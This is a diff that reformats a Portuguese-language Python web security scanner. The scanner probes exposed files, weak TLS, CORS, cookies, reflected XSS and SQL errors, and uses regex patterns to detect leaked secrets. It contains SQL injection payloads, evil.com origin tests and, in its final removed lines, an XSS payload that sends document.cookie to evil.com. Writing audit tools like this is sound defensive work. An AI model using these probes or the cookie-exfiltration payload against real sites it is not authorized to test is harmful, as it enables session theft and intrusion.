@@ -72,10 +72,27 @@ SECURITY_HEADERS_RECS = {
 }
 
 INTERESTING_PATHS = (
-    ".env", ".git/HEAD", "backup.zip", "backup.tar.gz", "dump.sql", "db.sql",
-    "config.php", "phpinfo.php", "server-status", "actuator", "actuator/env",
-    "swagger.json", "swagger-ui/", "api-docs", "openapi.json", "robots.txt",
-    "sitemap.xml", "admin", "login", "wp-admin", "phpmyadmin",
+    ".env",
+    ".git/HEAD",
+    "backup.zip",
+    "backup.tar.gz",
+    "dump.sql",
+    "db.sql",
+    "config.php",
+    "phpinfo.php",
+    "server-status",
+    "actuator",
+    "actuator/env",
+    "swagger.json",
+    "swagger-ui/",
+    "api-docs",
+    "openapi.json",
+    "robots.txt",
+    "sitemap.xml",
+    "admin",
+    "login",
+    "wp-admin",
+    "phpmyadmin",
 )
 
 METHODS_TO_TEST = ["PUT", "DELETE", "PATCH", "TRACE", "OPTIONS", "HEAD"]
@@ -134,65 +151,82 @@ SQL_ERROR_PATTERNS: dict[str, list[re.Pattern[str]]] = {
     ],
 }
 
-SQLI_PAYLOADS = ("'", "\"", "`", "' OR '1'='1", "\" OR \"1\"=\"1")
+SQLI_PAYLOADS = ("'", '"', "`", "' OR '1'='1", '" OR "1"="1')
 
-CSRF_FIELD_NAMES_LOWER = frozenset({
-    "csrf_token", "_csrf", "csrf", "csrftoken", "_token",
-    "authenticity_token", "xsrf-token", "_xsrf", "_csrf_token", "csrfmiddlewaretoken", "__requestverificationtoken",
-})
+CSRF_FIELD_NAMES_LOWER = frozenset(
+    {
+        "csrf_token",
+        "_csrf",
+        "csrf",
+        "csrftoken",
+        "_token",
+        "authenticity_token",
+        "xsrf-token",
+        "_xsrf",
+        "_csrf_token",
+        "csrfmiddlewaretoken",
+        "__requestverificationtoken",
+    }
+)
 
 DEFAULT_INJECT_PARAMS = ("q", "id", "search", "page", "name", "user", "cmd", "file", "path", "input")
 
 _SENSITIVE_HIDDEN_FIELDS: dict[str, tuple[str, str, list[re.Pattern[str]]]] = {
-    "credential_field": ("critical", "exposure", [
-        re.compile(r"(?:password|passwd|pwd|pass)\b", re.IGNORECASE),
-    ]),
-    "api_key_field": ("high", "exposure", [
-        re.compile(r"(?:api[_-]?key|apikey|secret[_-]?key|access[_-]?key)\b", re.IGNORECASE),
-    ]),
-    "token_field": ("high", "exposure", [
-        re.compile(r"(?:auth[_-]?token|bearer|jwt|session[_-]?token|access[_-]?token)\b", re.IGNORECASE),
-    ]),
-    "private_key_field": ("critical", "exposure", [
-        re.compile(r"(?:private[_-]?key|ssh[_-]?key|pgp)\b", re.IGNORECASE),
-    ]),
-    "internal_id_field": ("low", "info_leak", [
-        re.compile(r"(?:user[_-]?id|customer[_-]?id|account[_-]?id|employee[_-]?id)\b", re.IGNORECASE),
-    ]),
+    "credential_field": (
+        "critical",
+        "exposure",
+        [
+            re.compile(r"(?:password|passwd|pwd|pass)\b", re.IGNORECASE),
+        ],
+    ),
+    "api_key_field": (
+        "high",
+        "exposure",
+        [
+            re.compile(r"(?:api[_-]?key|apikey|secret[_-]?key|access[_-]?key)\b", re.IGNORECASE),
+        ],
+    ),
+    "token_field": (
+        "high",
+        "exposure",
+        [
+            re.compile(r"(?:auth[_-]?token|bearer|jwt|session[_-]?token|access[_-]?token)\b", re.IGNORECASE),
+        ],
+    ),
+    "private_key_field": (
+        "critical",
+        "exposure",
+        [
+            re.compile(r"(?:private[_-]?key|ssh[_-]?key|pgp)\b", re.IGNORECASE),
+        ],
+    ),
+    "internal_id_field": (
+        "low",
+        "info_leak",
+        [
+            re.compile(r"(?:user[_-]?id|customer[_-]?id|account[_-]?id|employee[_-]?id)\b", re.IGNORECASE),
+        ],
+    ),
 }
 
 _SENSITIVE_VALUE_PATTERNS: dict[str, tuple[str, str, re.Pattern[str]]] = {
-    "jwt_token": ("high", "exposure",
-        re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}")),
-    "aws_access_key": ("critical", "exposure",
-        re.compile(r"(?:AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}")),
-    "hardcoded_password": ("high", "exposure",
-        re.compile(r"^(?:admin|password|123456|secret|changeme|root)$", re.IGNORECASE)),
-    "base64_token": ("medium", "exposure",
-        re.compile(r"^[A-Za-z0-9+/]{40,}={0,2}$")),
-    "hex_token": ("medium", "exposure",
-        re.compile(r"^[0-9a-f]{32,}$", re.IGNORECASE)),
-    "private_key_block": ("critical", "exposure",
-        re.compile(r"-----BEGIN\s+(?:RSA|DSA|EC)?\s*PRIVATE\s+KEY-----")),
+    "jwt_token": ("high", "exposure", re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}")),
+    "aws_access_key": ("critical", "exposure", re.compile(r"(?:AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}")),
+    "hardcoded_password": ("high", "exposure", re.compile(r"^(?:admin|password|123456|secret|changeme|root)$", re.IGNORECASE)),
+    "base64_token": ("medium", "exposure", re.compile(r"^[A-Za-z0-9+/]{40,}={0,2}$")),
+    "hex_token": ("medium", "exposure", re.compile(r"^[0-9a-f]{32,}$", re.IGNORECASE)),
+    "private_key_block": ("critical", "exposure", re.compile(r"-----BEGIN\s+(?:RSA|DSA|EC)?\s*PRIVATE\s+KEY-----")),
 }
 
 _JS_SECRET_PATTERNS: dict[str, tuple[str, str, re.Pattern[str]]] = {
-    "google_api_key": ("high", "exposure",
-        re.compile(r"AIza[0-9A-Za-z_-]{35}")),
-    "github_token": ("critical", "exposure",
-        re.compile(r"ghp_[0-9A-Za-z]{36}")),
-    "stripe_key": ("critical", "exposure",
-        re.compile(r"sk_live_[0-9a-zA-Z]{24,}")),
-    "firebase_url": ("high", "exposure",
-        re.compile(r"https?://[a-z0-9-]+\.firebaseio\.com")),
-    "aws_access_key": ("critical", "exposure",
-        re.compile(r"(?:AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}")),
-    "jwt_token": ("high", "exposure",
-        re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}")),
-    "private_key_block": ("critical", "exposure",
-        re.compile(r"-----BEGIN\s+(?:RSA|DSA|EC)?\s*PRIVATE\s+KEY-----")),
-    "hardcoded_secret": ("high", "exposure",
-        re.compile(r"""(?:password|secret|api[_-]?key|token)\s*[:=]\s*['"][^'"]{8,}['"]""", re.IGNORECASE)),
+    "google_api_key": ("high", "exposure", re.compile(r"AIza[0-9A-Za-z_-]{35}")),
+    "github_token": ("critical", "exposure", re.compile(r"ghp_[0-9A-Za-z]{36}")),
+    "stripe_key": ("critical", "exposure", re.compile(r"sk_live_[0-9a-zA-Z]{24,}")),
+    "firebase_url": ("high", "exposure", re.compile(r"https?://[a-z0-9-]+\.firebaseio\.com")),
+    "aws_access_key": ("critical", "exposure", re.compile(r"(?:AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}")),
+    "jwt_token": ("high", "exposure", re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}")),
+    "private_key_block": ("critical", "exposure", re.compile(r"-----BEGIN\s+(?:RSA|DSA|EC)?\s*PRIVATE\s+KEY-----")),
+    "hardcoded_secret": ("high", "exposure", re.compile(r"""(?:password|secret|api[_-]?key|token)\s*[:=]\s*['"][^'"]{8,}['"]""", re.IGNORECASE)),
 }
 
 _JS_ENDPOINT_PATTERNS: list[tuple[str, re.Pattern[str]]] = [
@@ -337,13 +371,15 @@ def analyze_error_response(body: str) -> list[Finding]:
                 start = max(0, match.start() - 50)
                 end = min(len(body), match.end() + 50)
                 snippet = body[start:end].strip()
-                findings.append(Finding(
-                    _ERROR_INFO_SEVERITY[category],
-                    "info_leak",
-                    f"{category} detectado",
-                    snippet[:200],
-                    _ERROR_INFO_RECOMMENDATIONS[category],
-                ))
+                findings.append(
+                    Finding(
+                        _ERROR_INFO_SEVERITY[category],
+                        "info_leak",
+                        f"{category} detectado",
+                        snippet[:200],
+                        _ERROR_INFO_RECOMMENDATIONS[category],
+                    )
+                )
                 break
     return findings
 
@@ -369,30 +405,36 @@ def analyze_headers_findings(
                 break
         if not matched:
             cookie_rules = cast(list[tuple[str, str]], waf_rules.get("cookies", []))
-            all_cookies = " ".join(
-                (raw_headers or {}).get("set-cookie", [])
-            )
+            all_cookies = " ".join((raw_headers or {}).get("set-cookie", []))
             for cookie_name, cookie_pat in cookie_rules:
                 if re.search(cookie_name, all_cookies, re.IGNORECASE) and re.search(cookie_pat, all_cookies):
                     matched = True
                     break
         if matched:
-            findings.append(Finding(
-                "info", "waf", f"WAF/CDN detectado: {waf_name}",
-                f"WAF {waf_name} detectado via headers/cookies.",
-                "Considere o impacto no escaneamento e ajuste payloads conforme necessario.",
-                "",
-            ))
+            findings.append(
+                Finding(
+                    "info",
+                    "waf",
+                    f"WAF/CDN detectado: {waf_name}",
+                    f"WAF {waf_name} detectado via headers/cookies.",
+                    "Considere o impacto no escaneamento e ajuste payloads conforme necessario.",
+                    "",
+                )
+            )
 
     for header_name, (severity, category, recommendation) in _VERBOSE_ERROR_HEADERS.items():
         if header_name in lower_headers:
             value = lower_headers[header_name]
-            findings.append(Finding(
-                severity, category, f"Header verbose/exposto: {header_name}",
-                f"{header_name}: {value[:120]}",
-                recommendation,
-                f"curl -I {{url}} 2>/dev/null | grep -i '{header_name}'",
-            ))
+            findings.append(
+                Finding(
+                    severity,
+                    category,
+                    f"Header verbose/exposto: {header_name}",
+                    f"{header_name}: {value[:120]}",
+                    recommendation,
+                    f"curl -I {{url}} 2>/dev/null | grep -i '{header_name}'",
+                )
+            )
 
     return findings
 
@@ -415,27 +457,32 @@ def analyze_hidden_fields(hidden_fields: list[tuple[str, str]]) -> list[Finding]
                 continue
             for pattern in patterns:
                 if pattern.search(name_lower):
-                    findings.append(Finding(
-                        severity, category,
-                        f"Campo hidden sensivel: {name_lower}",
-                        f"Hidden field '{name}' pode conter dados sensiveis.",
-                        "Nao armazene credenciais ou dados sensiveis em campos hidden.",
-                        f"# Verifique o valor via DevTools (Elements > <input type=\"hidden\">)\n"
-                        f"grep -r '{name}' .",
-                    ))
+                    findings.append(
+                        Finding(
+                            severity,
+                            category,
+                            f"Campo hidden sensivel: {name_lower}",
+                            f"Hidden field '{name}' pode conter dados sensiveis.",
+                            "Nao armazene credenciais ou dados sensiveis em campos hidden.",
+                            f"# Verifique o valor via DevTools (Elements > <input type=\"hidden\">)\ngrep -r '{name}' .",
+                        )
+                    )
                     seen_fields.add(field_type)
                     break
 
         if value:
             for value_type, (severity, category, pattern) in _SENSITIVE_VALUE_PATTERNS.items():
                 if pattern.search(value):
-                    findings.append(Finding(
-                        severity, category,
-                        f"Valor sensiveis em hidden field '{name}'",
-                        f"Valor em hidden field contem {value_type.replace('_', ' ')}.",
-                        "Nunca exponha tokens, keys ou credenciais em campos hidden.",
-                        f"# Valor detectado comecando por: {value[:20]}...",
-                    ))
+                    findings.append(
+                        Finding(
+                            severity,
+                            category,
+                            f"Valor sensiveis em hidden field '{name}'",
+                            f"Valor em hidden field contem {value_type.replace('_', ' ')}.",
+                            "Nunca exponha tokens, keys ou credenciais em campos hidden.",
+                            f"# Valor detectado comecando por: {value[:20]}...",
+                        )
+                    )
                     break
 
     return findings
@@ -464,15 +511,16 @@ def analyze_url_params(url: str) -> list[Finding]:
             if pattern_name in seen_names:
                 continue
             if name_lower == pattern_name or pattern_name in name_lower:
-                findings.append(Finding(
-                    severity, category,
-                    f"API key/token em URL (param: {param_name})",
-                    f"Query param '{param_name}' pode conter dado sensiveis em URL exposta.",
-                    recommendation,
-                    f"# Verifique logs de acesso:\n"
-                    f"grep '{param_name}' /var/log/nginx/access.log\n"
-                    f"# Verifique se o param aparece em Referer headers.",
-                ))
+                findings.append(
+                    Finding(
+                        severity,
+                        category,
+                        f"API key/token em URL (param: {param_name})",
+                        f"Query param '{param_name}' pode conter dado sensiveis em URL exposta.",
+                        recommendation,
+                        f"# Verifique logs de acesso:\ngrep '{param_name}' /var/log/nginx/access.log\n# Verifique se o param aparece em Referer headers.",
+                    )
+                )
                 seen_names.add(pattern_name)
                 break
 
@@ -483,14 +531,16 @@ def analyze_url_params(url: str) -> list[Finding]:
                 if value_type in seen_values:
                     continue
                 if pattern.search(value):
-                    findings.append(Finding(
-                        severity, category,
-                        f"Valor sensiveis em URL (param: {param_name})",
-                        f"Query param '{param_name}' contem {value_type.replace('_', ' ')} em URL visivel.",
-                        "Nunca exponha tokens, keys ou credenciais em URLs. Use headers Authorization.",
-                        f"# Valor detectado comecando por: {value[:20]}...\n"
-                        f"# Mova para: export {param_name.upper()}=<valor>",
-                    ))
+                    findings.append(
+                        Finding(
+                            severity,
+                            category,
+                            f"Valor sensiveis em URL (param: {param_name})",
+                            f"Query param '{param_name}' contem {value_type.replace('_', ' ')} em URL visivel.",
+                            "Nunca exponha tokens, keys ou credenciais em URLs. Use headers Authorization.",
+                            f"# Valor detectado comecando por: {value[:20]}...\n# Mova para: export {param_name.upper()}=<valor>",
+                        )
+                    )
                     seen_values.add(value_type)
                     break
 
@@ -507,13 +557,16 @@ def analyze_js_content(
     for secret_type, (severity, category, pattern) in _JS_SECRET_PATTERNS.items():
         for match in pattern.finditer(js_text):
             snippet = js_text[max(0, match.start() - 30) : match.end() + 30]
-            findings.append(Finding(
-                severity, category,
-                f"Secret em JS ({secret_type})",
-                f"Encontrado em {source or 'JS inline'}: ...{snippet[:150]}...",
-                f"Remova {secret_type.replace('_', ' ')} do codigo JS e mova para variaveis de ambiente.",
-                "",
-            ))
+            findings.append(
+                Finding(
+                    severity,
+                    category,
+                    f"Secret em JS ({secret_type})",
+                    f"Encontrado em {source or 'JS inline'}: ...{snippet[:150]}...",
+                    f"Remova {secret_type.replace('_', ' ')} do codigo JS e mova para variaveis de ambiente.",
+                    "",
+                )
+            )
             break
 
     endpoint_count = 0
@@ -522,13 +575,16 @@ def analyze_js_content(
             if endpoint_count >= 5:
                 break
             endpoint = match.group(1) if match.lastindex else match.group(0)
-            findings.append(Finding(
-                "low", "info_leak",
-                f"Endpoint exposto em JS: {ep_name}",
-                f"Endpoint '{endpoint[:120]}' encontrado em {source or 'JS inline'}.",
-                "Endpoints hardcoded podem revelar estrutura da API.",
-                "",
-            ))
+            findings.append(
+                Finding(
+                    "low",
+                    "info_leak",
+                    f"Endpoint exposto em JS: {ep_name}",
+                    f"Endpoint '{endpoint[:120]}' encontrado em {source or 'JS inline'}.",
+                    "Endpoints hardcoded podem revelar estrutura da API.",
+                    "",
+                )
+            )
             endpoint_count += 1
         if endpoint_count >= 5:
             break
@@ -549,7 +605,10 @@ async def analyze_js_files(
         full_url = urljoin(base_url, url)
         try:
             status, _, body, _ = await fetch(
-                client, full_url, timeout=timeout, rate_limiter=rate_limiter,
+                client,
+                full_url,
+                timeout=timeout,
+                rate_limiter=rate_limiter,
             )
             if status == 200:
                 text = body.decode("utf-8", errors="ignore")[:50_000]
@@ -718,13 +777,16 @@ class AuditResult:
     session_fixation: bool = False
 
 
-banner = create_banner(r"""
+banner = create_banner(
+    r"""
     ___   __  __             __      ___             ___ __
    /   | / /_/ /_____ ______/ /__   /   | __  ______/ (_) /_
   / /| |/ __/ __/ __ `/ ___/ //_/  / /| |/ / / / __  / / __/
  / ___ / /_/ /_/ /_/ / /__/ ,<    / ___ / /_/ / /_/ / / /_
 /_/  |_\__/\__/\__,_/\___/_/|_|  /_/  |_\__,_/\__,_/_/\__/
-""", "   red/blue web audit | ofensivo autorizado + hardening defensivo")
+""",
+    "   red/blue web audit | ofensivo autorizado + hardening defensivo",
+)
 
 
 def load_paths_from_file(paths_file: str) -> list[str]:
@@ -757,9 +819,11 @@ def _tls_info_sync(url: str, timeout: float) -> tuple[str, str, str]:
     context = ssl.create_default_context()
     try:
         with (
-    socket.create_connection((parsed.hostname or "", port), timeout=timeout) as sock, context.wrap_socket(sock, server_hostname=parsed.hostname) as tls,):
-         cert = tls.getpeercert()
-    except (OSError, ssl.SSLError, TimeoutError):
+            socket.create_connection((parsed.hostname or "", port), timeout=timeout) as sock,
+            context.wrap_socket(sock, server_hostname=parsed.hostname) as tls,
+        ):
+            cert = tls.getpeercert()
+    except OSError, ssl.SSLError, TimeoutError:
         return "", "", ""
 
     if cert is None:
@@ -806,9 +870,9 @@ def _check_tls_versions_sync(url: str, timeout: float) -> list[TLSVersionResult]
     results: list[TLSVersionResult] = []
 
     version_configs = [
-        ("SSLv3", ssl.TLSVersion.SSLv3 if hasattr(ssl.TLSVersion, 'SSLv3') else None),
-        ("TLS 1.0", ssl.TLSVersion.TLSv1 if hasattr(ssl.TLSVersion, 'TLSv1') else None),
-        ("TLS 1.1", ssl.TLSVersion.TLSv1_1 if hasattr(ssl.TLSVersion, 'TLSv1_1') else None),
+        ("SSLv3", ssl.TLSVersion.SSLv3 if hasattr(ssl.TLSVersion, "SSLv3") else None),
+        ("TLS 1.0", ssl.TLSVersion.TLSv1 if hasattr(ssl.TLSVersion, "TLSv1") else None),
+        ("TLS 1.1", ssl.TLSVersion.TLSv1_1 if hasattr(ssl.TLSVersion, "TLSv1_1") else None),
         ("TLS 1.2", ssl.TLSVersion.TLSv1_2),
         ("TLS 1.3", ssl.TLSVersion.TLSv1_3),
     ]
@@ -826,10 +890,10 @@ def _check_tls_versions_sync(url: str, timeout: float) -> list[TLSVersionResult]
                 ctx.minimum_version = tls_version
                 ctx.maximum_version = tls_version
                 with (
-                socket.create_connection((hostname, port), timeout=timeout) as sock,
-                ctx.wrap_socket(sock, server_hostname=hostname) as tls_sock,
-            ):
-                 _ = tls_sock.version()
+                    socket.create_connection((hostname, port), timeout=timeout) as sock,
+                    ctx.wrap_socket(sock, server_hostname=hostname) as tls_sock,
+                ):
+                    _ = tls_sock.version()
             results.append(TLSVersionResult(protocol=protocol_name, supported=True))
         except (ssl.SSLError, OSError, TimeoutError) as e:
             results.append(TLSVersionResult(protocol=protocol_name, supported=False, reason=str(e)[:80]))
@@ -868,7 +932,7 @@ async def check_xss_reflection(
         marker = "xss" + secrets.token_hex(4)
         parsed = urlparse(base_url)
         if parsed.query and param + "=" in parsed.query:
-            test_url = re.sub(rf'{re.escape(param)}=[^&]*', param + "=" + marker, base_url, count=1)
+            test_url = re.sub(rf"{re.escape(param)}=[^&]*", param + "=" + marker, base_url, count=1)
         else:
             separator = "&" if "?" in base_url else "?"
             test_url = base_url + separator + param + "=" + marker
@@ -884,7 +948,7 @@ async def check_xss_reflection(
             marker_lower = marker.lower()
             context = "html_body"
             idx = lower_text.find(marker_lower)
-            snippet = text[max(0, idx - 30):idx + len(marker) + 30]
+            snippet = text[max(0, idx - 30) : idx + len(marker) + 30]
             return True, f"refletido em {context} via param={param}: ...{snippet}..."
     return False, ""
 
@@ -917,7 +981,7 @@ async def check_sqli_errors(
     async def _test_one(param: str, payload: str) -> list[str]:
         async with sem:
             if parsed.query:
-                test_url = re.sub(rf'{re.escape(param)}=[^&]*', param + "=" + payload, base_url, count=1)
+                test_url = re.sub(rf"{re.escape(param)}=[^&]*", param + "=" + payload, base_url, count=1)
             else:
                 test_url = base_url + "?" + param + "=" + payload
 
@@ -935,11 +999,7 @@ async def check_sqli_errors(
                         break
             return found
 
-    tasks = [
-        _test_one(param, payload)
-        for param in inject_params
-        for payload in SQLI_PAYLOADS[:2]
-    ]
+    tasks = [_test_one(param, payload) for param in inject_params for payload in SQLI_PAYLOADS[:2]]
     async with asyncio.TaskGroup() as tg:
         futures = [tg.create_task(t) for t in tasks]
     results = [f.result() for f in futures]
@@ -1183,114 +1243,148 @@ def build_findings(
     lower_headers = {key.lower(): value for key, value in headers.items()}
 
     if parsed.scheme == "http":
-        findings.append(Finding(
-            "high", "transport", "HTTP sem TLS",
-            "A pagina principal respondeu sem HTTPS.",
-            "Force HTTPS, redirecione HTTP para HTTPS e use HSTS.",
-            f"curl -v {url}\n"
-            f"Mitigacao: configure HTTPS + HSTS header:\n"
-            f"  Strict-Transport-Security: max-age=31536000; includeSubDomains",
-        ))
+        findings.append(
+            Finding(
+                "high",
+                "transport",
+                "HTTP sem TLS",
+                "A pagina principal respondeu sem HTTPS.",
+                "Force HTTPS, redirecione HTTP para HTTPS e use HSTS.",
+                f"curl -v {url}\nMitigacao: configure HTTPS + HSTS header:\n  Strict-Transport-Security: max-age=31536000; includeSubDomains",
+            )
+        )
     elif not tls_subject:
-        findings.append(Finding(
-            "medium", "transport", "TLS nao validado pela ferramenta",
-            "Nao foi possivel coletar certificado TLS.",
-            "Verifique validade, cadeia, hostname e protocolos aceitos.",
-            f"openssl s_client -connect {parsed.hostname}:{parsed.port or 443} -servername {parsed.hostname} </dev/null 2>/dev/null | openssl x509 -noout -dates -subject -issuer",
-        ))
+        findings.append(
+            Finding(
+                "medium",
+                "transport",
+                "TLS nao validado pela ferramenta",
+                "Nao foi possivel coletar certificado TLS.",
+                "Verifique validade, cadeia, hostname e protocolos aceitos.",
+                f"openssl s_client -connect {parsed.hostname}:{parsed.port or 443} -servername {parsed.hostname} </dev/null 2>/dev/null | openssl x509 -noout -dates -subject -issuer",
+            )
+        )
 
     if tls_versions:
         weak_versions = [tv for tv in tls_versions if tv.supported and tv.protocol in ("SSLv3", "TLS 1.0", "TLS 1.1")]
-        findings.extend(Finding(
-                "high", "transport", f"Versao TLS obsoleta: {tv.protocol}",
+        findings.extend(
+            Finding(
+                "high",
+                "transport",
+                f"Versao TLS obsoleta: {tv.protocol}",
                 f"{tv.protocol} esta habilitado no servidor.",
                 f"Desabilite {tv.protocol} e use no minimo TLS 1.2.",
                 f"openssl s_client -connect {parsed.hostname}:{parsed.port or 443} -{tv.protocol.lower().replace(' ', '').replace('.', '')} </dev/null 2>/dev/null",
-            ) for tv in weak_versions)
+            )
+            for tv in weak_versions
+        )
 
     for header, recommendation in SECURITY_HEADERS_RECS.items():
         if header not in lower_headers:
             exploit_cmd = f"curl -I {url} 2>/dev/null | grep -i '{header}'"
-            findings.append(Finding(
-                "medium", "headers", f"Header ausente: {header}",
-                "Header nao apareceu na resposta principal.",
-                recommendation,
-                exploit_cmd,
-            ))
+            findings.append(
+                Finding(
+                    "medium",
+                    "headers",
+                    f"Header ausente: {header}",
+                    "Header nao apareceu na resposta principal.",
+                    recommendation,
+                    exploit_cmd,
+                )
+            )
 
     findings.extend(analyze_headers_findings(headers, raw_headers))
 
     server = header_get(headers, "server")
     if server:
-        findings.append(Finding("low", "fingerprint", "Server exposto", server, "Reduza versao/banner quando possivel.",
-                                f"curl -I {url} 2>/dev/null | grep -i server"))
+        findings.append(
+            Finding("low", "fingerprint", "Server exposto", server, "Reduza versao/banner quando possivel.", f"curl -I {url} 2>/dev/null | grep -i server")
+        )
 
     cors = header_get(headers, "access-control-allow-origin")
     if cors == "*":
-        findings.append(Finding(
-            "medium", "cors", "CORS permissivo",
-            "Access-Control-Allow-Origin: *",
-            "Restrinja origens permitidas e revise credenciais CORS.",
-            f"curl -H \"Origin: http://evil.com\" -I {url} 2>/dev/null | grep -i access-control\n"
-            f"# Teste com credenciais:\n"
-            f"curl -H \"Origin: http://evil.com\" -H \"Cookie: session=abc\" {url}",
-        ))
+        findings.append(
+            Finding(
+                "medium",
+                "cors",
+                "CORS permissivo",
+                "Access-Control-Allow-Origin: *",
+                "Restrinja origens permitidas e revise credenciais CORS.",
+                f'curl -H "Origin: http://evil.com" -I {url} 2>/dev/null | grep -i access-control\n'
+                f"# Teste com credenciais:\n"
+                f'curl -H "Origin: http://evil.com" -H "Cookie: session=abc" {url}',
+            )
+        )
 
     cookies = (raw_headers or {}).get("set-cookie", [])
     for cookie in cookies:
         lowered = cookie.lower()
         missing = [flag for flag in ("httponly", "secure", "samesite") if flag not in lowered]
         if missing:
-            findings.append(Finding(
-                "medium", "cookies", "Cookie sem flags fortes",
-                f"faltando: {', '.join(missing)}",
-                "Use Secure, HttpOnly e SameSite em cookies sensiveis.",
-                f"curl -v {url} 2>&1 | grep -i set-cookie\n"
-                f"Cookie detectado: {cookie[:60]}...",
-            ))
+            findings.append(
+                Finding(
+                    "medium",
+                    "cookies",
+                    "Cookie sem flags fortes",
+                    f"faltando: {', '.join(missing)}",
+                    "Use Secure, HttpOnly e SameSite em cookies sensiveis.",
+                    f"curl -v {url} 2>&1 | grep -i set-cookie\nCookie detectado: {cookie[:60]}...",
+                )
+            )
 
     dangerous_methods = [method for method in methods if method in {"PUT", "DELETE", "TRACE", "CONNECT"}]
     if dangerous_methods:
-        curl_examples = "\n".join(
-            f"  curl -X {m} {url}/test -d 'test'" if m in {"PUT", "DELETE"}
-            else f"  curl -X {m} {url}"
-            for m in dangerous_methods
+        curl_examples = "\n".join(f"  curl -X {m} {url}/test -d 'test'" if m in {"PUT", "DELETE"} else f"  curl -X {m} {url}" for m in dangerous_methods)
+        findings.append(
+            Finding(
+                "high",
+                "methods",
+                "Metodos HTTP perigosos habilitados",
+                ", ".join(dangerous_methods),
+                "Desabilite metodos nao usados no servidor, proxy e aplicacao.",
+                curl_examples,
+            )
         )
-        findings.append(Finding(
-            "high", "methods", "Metodos HTTP perigosos habilitados",
-            ", ".join(dangerous_methods),
-            "Desabilite metodos nao usados no servidor, proxy e aplicacao.",
-            curl_examples,
-        ))
 
     if parser.password_inputs and parsed.scheme == "http":
-        findings.append(Finding(
-            "critical", "auth", "Senha em pagina sem HTTPS",
-            f"{parser.password_inputs} campo(s) password detectado(s).",
-            "Nunca sirva formularios de autenticacao via HTTP.",
-            f"curl -I {url} 2>/dev/null | grep -i 'type=\"password\"'\n"
-            f"# Credenciais serao transmitidas em claro! Interceptacao trivial com mitmproxy/tcpdump.",
-        ))
+        findings.append(
+            Finding(
+                "critical",
+                "auth",
+                "Senha em pagina sem HTTPS",
+                f"{parser.password_inputs} campo(s) password detectado(s).",
+                "Nunca sirva formularios de autenticacao via HTTP.",
+                f"curl -I {url} 2>/dev/null | grep -i 'type=\"password\"'\n"
+                f"# Credenciais serao transmitidas em claro! Interceptacao trivial com mitmproxy/tcpdump.",
+            )
+        )
     elif parser.password_inputs:
-        findings.append(Finding(
-            "info", "auth", "Formulario de login detectado",
-            f"{parser.password_inputs} campo(s) password detectado(s).",
-            "Revise MFA, rate limit, lockout e protecao contra credential stuffing.",
-            f"curl -s {url} | grep -i type=.password.\n"
-            f"# Verifique protecao contra brute force (rate limit, lockout, CAPTCHA).",
-        ))
+        findings.append(
+            Finding(
+                "info",
+                "auth",
+                "Formulario de login detectado",
+                f"{parser.password_inputs} campo(s) password detectado(s).",
+                "Revise MFA, rate limit, lockout e protecao contra credential stuffing.",
+                f"curl -s {url} | grep -i type=.password.\n# Verifique protecao contra brute force (rate limit, lockout, CAPTCHA).",
+            )
+        )
 
     if parser.comments:
-        findings.append(Finding(
-            "low", "content", "Comentarios HTML presentes",
-            parser.comments[0],
-            "Remova comentarios com detalhes internos, rotas, tokens ou tecnologia.",
-            f"curl -s {url} | grep -o '<!--.*-->'\n"
-            f"# Inspecione o codigo fonte no browser (Ctrl+U) para ver todos os comentarios.",
-        ))
+        findings.append(
+            Finding(
+                "low",
+                "content",
+                "Comentarios HTML presentes",
+                parser.comments[0],
+                "Remova comentarios com detalhes internos, rotas, tokens ou tecnologia.",
+                f"curl -s {url} | grep -o '<!--.*-->'\n# Inspecione o codigo fonte no browser (Ctrl+U) para ver todos os comentarios.",
+            )
+        )
 
     sensitive_hits = [
-        probe for probe in probes
+        probe
+        for probe in probes
         if probe.status in {200, 401, 403} and any(token in probe.url for token in (".env", ".git", "dump", "backup", "config", "phpinfo", "actuator"))
     ]
     for probe in sensitive_hits:
@@ -1306,66 +1400,85 @@ def build_findings(
             exploit_cmd += "\n# Informacoes detalhadas do servidor: modulos, configs, paths"
         elif "actuator" in probe.url:
             exploit_cmd += "\n# Spring Boot Actuator: endpoints de gerenciamento expostos"
-        findings.append(Finding(
-            severity, "exposure", "Endpoint/arquivo sensivel exposto",
-            f"{probe.status} {probe.url}",
-            "Remova arquivos sensiveis do webroot e restrinja endpoints administrativos.",
-            exploit_cmd,
-        ))
+        findings.append(
+            Finding(
+                severity,
+                "exposure",
+                "Endpoint/arquivo sensivel exposto",
+                f"{probe.status} {probe.url}",
+                "Remova arquivos sensiveis do webroot e restrinja endpoints administrativos.",
+                exploit_cmd,
+            )
+        )
 
     if 500 <= status < 600:
         body_snippet = body_text[:300].strip() if body_text else f"HTTP {status}"
-        findings.append(Finding(
-            "medium", "stability", "Erro 5xx na pagina principal",
-            body_snippet,
-            "Investigue logs e tratamento de erro para evitar vazamento e indisponibilidade.",
-            f"curl -v {url}\n"
-            f"# Verifique se a resposta contem stack traces ou informacoes internas.",
-        ))
+        findings.append(
+            Finding(
+                "medium",
+                "stability",
+                "Erro 5xx na pagina principal",
+                body_snippet,
+                "Investigue logs e tratamento de erro para evitar vazamento e indisponibilidade.",
+                f"curl -v {url}\n# Verifique se a resposta contem stack traces ou informacoes internas.",
+            )
+        )
 
     if body_text:
         findings.extend(analyze_error_response(body_text))
 
     if xss_reflected:
-        findings.append(Finding(
-            "high", "xss", "Entrada refletida sem sanitizacao",
-            xss_evidence,
-            "Use encoding de saida (HTML entities) e CSP para mitigar XSS refletido.",
-            f"# Payload basico:\n"
-            f"curl \"{url}/?q=<script>alert(1)</script>\"\n"
-            f"# Payload de exfiltracao:\n"
-            f"curl \"{url}/?q=<script>document.location='http://evil.com/?c='+document.cookie</script>\"\n"
-            f"# Verifique se o navegador executa o script.",
-        ))
